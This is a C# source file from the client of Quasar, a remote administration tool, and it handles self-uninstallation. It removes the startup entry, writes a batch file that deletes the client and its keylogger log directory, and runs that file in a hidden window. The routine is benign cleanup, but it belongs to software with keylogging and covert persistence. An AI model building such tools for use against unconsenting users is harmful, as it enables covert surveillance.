using Quasar.Client.Config;
using Quasar.Client.Data;
using Quasar.Client.IO;
using Quasar.Client.Utilities;
using Quasar.Common.Messages;
using System;
using System.Diagnostics;

namespace Quasar.Client.Installation
{
    public static class ClientUninstaller
    {
        public static void Uninstall(Networking.Client client)
        {
            try
            {
                if (Settings.STARTUP)
                    Startup.RemoveFromStartup();

                string batchFile = BatchFile.CreateUninstallBatch(ClientData.CurrentPath, Keylogger.LogDirectory);

                if (string.IsNullOrEmpty(batchFile))
                    throw new Exception("Could not create uninstall-batch file");

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);

                Program.ConnectClient.Exit();
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus {Message = $"Uninstall failed: {ex.Message}"});
            }
        }
    }
}
